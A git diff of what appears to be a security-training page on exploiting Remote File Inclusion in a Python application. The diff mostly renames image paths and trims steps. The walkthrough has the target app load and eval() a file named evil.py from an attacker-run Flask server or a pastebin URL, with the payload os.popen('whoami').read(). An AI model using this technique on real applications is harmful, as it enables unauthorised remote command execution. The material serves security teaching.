@@ -48,27 +48,15 @@ Sensitive Information Disclosure
 
 Let us see how can we exploit the file inclusion vulnerability in a real world scenario, the application here allows us to run 2 commands from the drop down list. One is running Date and the other is Calendar.
 
-![](../../.gitbook/assets/RFI1.png)
+![](../../.gitbook/assets/python/RFI/1.png)
 
-![](../../.gitbook/assets/RFI2.png)
+![](../../.gitbook/assets/python/RFI/2.png)
 
 When we will have a look in our intercepting proxy we can see that the application uses a predefined file that contains the command to execute and prints the results of it.
 
-![](../../.gitbook/assets/RFI3.png)
+![](../../.gitbook/assets/python/RFI/3.png)
 
-To exploit Remote File Inclusion vulnerability, we have two approaches documented in detail below:
-
-1. Use pastebin.com to serve the file including system command and include the pastebin raw url:
-
-For E.g.: You may copy the code below to pastebin.com ans save. Then include the raw URL which would look something like "[https://pastebin.com/raw/ZLeFHRNf](https://pastebin.com/raw/ZLeFHRNf)":
-
-```
-os.popen('whoami').read()
-```
-
-![](../../.gitbook/assets/RFI31.png)
-
-1. Creating your own webserver: In this case you can use Python Flask to create a small webserver that serves your file. We name it evil_server.py
+To exploit Remote File Inclusion vulnerability, let's use Python Flask to create a small webserver that serves your file. We name it evil_server.py
 
 ```python
 from flask import Flask, request, url_for, render_template, redirect
@@ -85,23 +73,15 @@ if __name__ == "__main__":
     app.run(host='0.0.0.0', port=1337)
 ```
 
-Then we create our folder template where we will put our evil.py file with the below content.
-
-```python
-5 + 5
-```
-
-Now we are ready to start our evil_server.py and try to make the application load our evil python file and hopefully it will get executed.
-
-![](../../.gitbook/assets/RFI4.png)
-
-Our remote file inclusion worked and the application seems to load python files and eval() the content of them. This means we can also inject a system command in our evil.py file.
+Then we create our folder template where we will put our evil.py file with the below content .
 
 ```python
 os.popen('whoami').read()
 ```
 
-![](../../.gitbook/assets/RFI5.png)
+Now we are ready to start our evil_server.py and try to make the application load our evil python file and hopefully it will get executed.
+
+![](../../.gitbook/assets/python/RFI/4.png)
 
 {% hint style="success" %}
 Success! As we observed, we can include our own files through RFI.
